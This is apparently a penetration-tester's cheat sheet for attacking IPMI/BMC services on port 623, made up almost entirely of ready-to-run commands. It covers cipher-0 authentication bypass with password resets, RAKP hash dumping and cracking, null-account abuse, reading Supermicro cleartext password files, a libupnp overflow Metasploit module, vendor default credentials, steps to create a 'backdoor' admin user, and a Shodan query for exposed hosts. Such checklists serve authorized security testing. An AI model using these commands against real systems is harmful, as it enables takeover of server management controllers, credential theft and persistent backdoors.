# IPMI Pentesting Checklist & Commands (Port 623/UDP/TCP)

## ğŸ¯ What am I realistically expecting to find here?

â­ After enumerating IPMI (port 623), I realistically expect:

- [ ] IPMI version (1.5 or 2.0)
- [ ] Default or weak credentials
- [ ] Cipher 0 (authentication bypass)
- [ ] Hash disclosure (RAKP hashes)
- [ ] Anonymous (null) accounts
- [ ] Outdated firmware with known exploits

---

## âœ… IPMI Pentest Checklist

### ğŸ” Discovery & Enumeration

- Scan for IPMI services:
    ```bash
    nmap -sU -p 623 <IP>
    nmap -p 623 <IP>
    ```

- Check IPMI version:
    ```bash
    msfconsole
    use auxiliary/scanner/ipmi/ipmi_version
    set RHOSTS <IP>
    run
    ```

---

### ğŸ› ï¸ Exploiting Cipher 0 (Auth Bypass)

- Identify vulnerability:
    ```bash
    msfconsole
    use auxiliary/scanner/ipmi/ipmi_cipher_zero
    set RHOSTS <IP>
    run
    ```

- Abuse with ipmitool:
    ```bash
    ipmitool -I lanplus -C 0 -H <IP> -U root -P root user list
    ipmitool -I lanplus -C 0 -H <IP> -U root -P root user set password 2 newpass
    ```

---

### ğŸ”‘ Dumping RAKP Hashes

- Retrieve user hashes:
    ```bash
    msfconsole
    use auxiliary/scanner/ipmi/ipmi_dumphashes
    set RHOSTS <IP>
    run
    ```

```c
#Another Tool To Dump The Hash
https://github.com/c0rnf13ld/ipmiPwner
```

- Crack with John/Hashcat:
    ```bash
    john --format=IPMI2 john.txt --wordlist=rockyou.txt
    ```

---

### ğŸ‘¥ Check for Anonymous Access

- List users with null credentials:
    ```bash
    ipmitool -I lanplus -H <IP> -U '' -P '' user list
    ```

- Reset password if possible:
    ```bash
    ipmitool -I lanplus -H <IP> -U '' -P '' user set password 2 newpassword
    ```

---

### ğŸ›‘ Supermicro IPMI Cleartext Passwords

- Extract passwords (requires system access):
    ```bash
    cat /nv/PSBlock
    ```

---

### âš¡ Exploiting UPnP Vulnerabilities

- Metasploit module:
    ```bash
    msfconsole
    use exploit/multi/upnp/libupnp_ssdp_overflow
    set RHOST <IP>
    run
    ```

---

### ğŸ—ï¸ Default Credentials

| Vendor                    | Username  | Password                        |
| ------------------------- | --------- | ------------------------------- |
| Dell iDRAC                | root      | calvin                          |
| IBM IMM                   | USERID    | PASSW0RD                        |
| Fujitsu iRMC              | admin     | admin                           |
| Supermicro IPMI 2.0       | ADMIN     | ADMIN                           |
| Oracle/Sun ILOM           | root      | changeme                        |

---

### ğŸ´â€â˜ ï¸ Local Attacks (from Host)

- Add backdoor user via local ipmitool:
    ```bash
    ipmitool user set name 4 backdoor
    ipmitool user set password 4 backdoor
    ipmitool user priv 4 4
    ```

---

## âœ… Shodan

- Search queries:
    - `port:623`
